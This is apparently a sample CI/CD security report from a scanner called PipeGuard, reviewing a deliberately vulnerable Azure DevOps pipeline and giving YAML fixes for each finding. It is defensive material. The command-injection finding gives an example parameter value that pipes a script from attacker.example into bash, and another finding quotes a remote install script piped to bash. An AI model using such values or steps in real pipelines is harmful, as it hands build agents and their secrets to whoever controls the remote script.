# PipeGuard report: `examples/vulnerable-pipeline.yml`

This is the kind of report PipeGuard produces for the demo pipeline in this folder.

## Summary

**This pipeline should not deploy to production as it stands: it holds a secret in plain text and lets anyone who can queue it run arbitrary commands.**

1 Critical, 4 High, 1 Medium, plus 2 housekeeping items.

## Findings

### [Critical] PG-S01: storage key in plain text (`vulnerable-pipeline.yml:12`)

```yaml
variables:
  storageKey: 'EXAMPLE-NOT-A-REAL-KEY-0000000000'
```

Anyone with read access to the repository has the key, and it stays in the Git history after removal. Line 34 also passes it as a command-line argument, where it can show up in process listings and logs.

Fix: move it to a Key Vault linked variable group, pass it through `env:`, and rotate the key.

```yaml
variables:
- group: contoso-shop-secrets   # placeholder: Key Vault linked group
- name: appName
  value: contoso-shop
```

### [High] PG-S02: command injection through `targetEnv` (`vulnerable-pipeline.yml:33-34`)

```yaml
echo "Deploying $(appName) to ${{ parameters.targetEnv }}"
./deploy.sh --env "${{ parameters.targetEnv }}" --storage-key "$(storageKey)"
```

The parameter is free text pasted into the script before it runs. A value such as `x"; curl https://attacker.example/s | bash; "` executes on the agent with access to the storage key.

Fix: restrict the parameter to known values and read everything from the environment.

```yaml
parameters:
- name: targetEnv
  displayName: Target environment
  type: string
  default: staging
  values:
  - staging
  - production
```

```yaml
- script: |
    echo "Deploying $APP_NAME to $TARGET_ENV"
    ./deploy.sh --env "$TARGET_ENV"
  displayName: Deploy
  env:
    APP_NAME: $(appName)
    TARGET_ENV: ${{ parameters.targetEnv }}
    STORAGE_KEY: $(storageKey)
```

### [High] PG-S05: production deployment with no gate (`vulnerable-pipeline.yml:32-35`)

The deploy runs as a plain step, so no approval or check can apply, and every push to `main` deploys.

Fix: use a `deployment` job bound to an environment, and configure approvals on that environment.

```yaml
jobs:
- deployment: Deploy
  environment: contoso-shop-${{ parameters.targetEnv }}
  timeoutInMinutes: 20
  strategy:
    runOnce:
      deploy:
        steps:
        - checkout: self
        # deploy step here
```

### [High] PG-S06: remote script piped to bash (`vulnerable-pipeline.yml:22`)

```yaml
- script: curl -sSL https://example.com/install-tools.sh | bash
```

Whoever controls that URL controls the build. Fix: install pinned versions from a package manager, or download a fixed version and verify its checksum before running it.

### [High] PG-S04: repository token left available to third-party code (`vulnerable-pipeline.yml:20`)

```yaml
- checkout: self
  persistCredentials: true
```

The token stays in the Git configuration while the remote script (line 22) and `npm install` (line 25) run. Nothing in this pipeline pushes to the repository, so remove the line.

### [Medium] PG-S10: dependency audit cannot fail the build (`vulnerable-pipeline.yml:28-30`)

```yaml
- script: npm audit --audit-level=high
  displayName: Dependency audit
  continueOnError: true
```

High-severity vulnerabilities are reported and then ignored. Fix: remove `continueOnError: true`.

## Housekeeping

- **PG-R01, no timeout** (`vulnerable-pipeline.yml:18`): a hanging deploy script holds the agent until the default limit. Set `timeoutInMinutes` on the job (included in the PG-S05 fix).
- **PG-C01, no dependency cache** (`vulnerable-pipeline.yml:25`): every run downloads all packages again. Add a `Cache@2` step keyed on `package-lock.json` and use `npm ci`.

## To check in Azure DevOps

- **Environment approvals**: once the deploy uses an environment, confirm approvals are configured on the production one (Pipelines > Environments).
- **Branch policies on `main`**: every push deploys, so confirm `main` requires a pull request.
- **Pull request builds** (PG-S14): the deploy step has no condition excluding pull requests. If this repository is on GitHub, or a build validation policy runs this pipeline, a pull request would deploy. Add `pr: none` or a branch condition on the deploy.

## Not audited

- `deploy.sh` and `install-tools.sh` were not provided.
